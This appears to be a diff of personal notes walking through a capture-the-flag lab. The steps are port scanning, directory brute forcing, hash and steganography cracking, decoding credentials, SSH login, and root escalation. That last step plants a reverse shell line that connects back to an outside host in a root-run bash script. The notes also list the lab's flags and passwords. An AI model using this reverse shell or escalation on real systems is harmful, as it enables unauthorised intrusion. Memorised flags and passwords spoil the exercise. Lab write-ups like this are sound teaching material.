@@ -1,0 +1,103 @@
+3 Ports are open 
+
+Nginx version 1.16.1 
+
+highest port is apache 
+
+
+
+Then we need to use go buster to find the first flag 
+
+/usr/share/wordlists we have the wordlist needed for brute forcing, this time we will be using the common.txt 
+
+ and found: http://10.201.8.106/hidden/ 
+
+Lets check for more sub directories inside of this 
+
+We get whatever direcotory which has a flaginside of the source code,
+
+Now we can try visiting the 65524 port and we can find a flag in that page not even hidden and in the page source we find a encoded text: ObsJmP173N2X…0Vu
+
+	It means /n0th1ng3ls3m4tt3r, it’s a directory 
+	
+	
+	And we find this: 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
+	
+	
+We can also enumerate the port 65524 , we found on http://10.201.111.239:65524/robots.txt
+
+		User-Agent:*
+		Disallow:/
+		Robots Not Allowed
+		User-Agent:a18672860d0510e5ab6699730763b250
+		Allow:/
+		This Flag Can Enter But Only This Flag No More Exceptions
+
+	
+	• Its a hash and theres a tool https://www.tunnelsup.com/ to analyses hashes so we know what type it is 
+	
+		Hash:	a18672860d0510e5ab6699730763b250
+		Hash type:	MD5 or MD4
+		Bit length:	128
+		Character length:	32
+		Character type:	hexidecimal
+		
+		
+	https://md5hashing.net/hash can be used to decode the hashes 
+	
+		○ ITS flag{1m_s3c0nd_fl4g}
+	
+	
+	
+	
+	
+	We can crack the: 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
+	
+	
+		And we get a password when using stegseek and the word list they provided 
+		
+		Mypasswordforthatjob
+		
+		
+		
+		
+	When we check the output file given by stegseek, we can see that it has a username and password which is in binary form 
+	
+	
+		username:boring
+		password:
+		01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
+		
+		
+			Decoded password: iconvertedmypasswordtobinary
+			
+			
+			
+	• Now that we have a password and username we can try ssh, remember to mention the port number in this case because its not the defualt ssh port this time 
+	
+	
+	Once we get in we find the user flag which hass a note saying its rotated:
+	
+		synt{a0jvgf33zfa0ez4y}
+		
+		
+		We can use https://rot13.com/ to rotate it again 
+		
+			flag{n0wits33msn0rm4l}
+			
+			
+			
+			
+	• We can find more stuff using ls -lah, because it shows hidden files 
+		○ After that we can easily find the user flag 
+				
+				flag{n0wits33msn0rm4l}
+				
+	• There was a file that runs on root which we can edit it’s a bash script file and technically its there just for us to edit the reverse shell in I used this reverse shell 
+	
+			/bin/bash -c 'bash -i >& /dev/tcp/10.4.5.252/8080 0>&1'
+			
+			
+	• The root flag was hidden in a root directory and as a hidden file 
+			
+			flag{63a9f0ea7bb98050796b649e85481845}
